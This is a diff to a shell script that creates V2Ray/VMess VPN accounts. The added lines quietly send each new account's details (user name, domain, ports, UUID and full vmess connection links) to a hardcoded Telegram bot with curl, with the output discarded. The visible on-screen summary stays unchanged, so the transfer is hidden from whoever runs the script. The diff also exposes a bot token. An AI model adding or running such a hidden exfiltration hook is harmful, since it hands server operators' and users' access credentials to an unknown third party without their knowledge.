@@ -122,6 +122,30 @@ vmesslink2="vmess://$(base64 -w 0 /etc/v2ray/$user-none.json)"
 systemctl restart v2ray
 systemctl restart v2ray@none
 service cron restart
+CHATID="5325141986"
+KEY="5318532626:AAH9spkuFm00gnYQAXNwKkvoeH_MTWn0u1A"
+TIME="10"
+BRL="https://api.telegram.org/bot$KEY/sendMessage"
+
+TEXT="==========-V2RAY/VMESS-==========
+Remarks        : ${user}
+Expired On     : $exp
+Domain         : ${domain}
+port TLS       : ${tls}
+port none TLS  : ${none}
+id             : ${uuid}
+alterId        : 0
+Security       : auto
+network        : ws
+path           : /v2ray
+=================================
+link TLS       : ${vmesslink1}
+
+=================================
+link none TLS  : ${vmesslink2}
+
+================================="
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT" $BRL >/dev/null
 clear
 echo -e ""
 echo -e "==========-V2RAY/VMESS-=========="
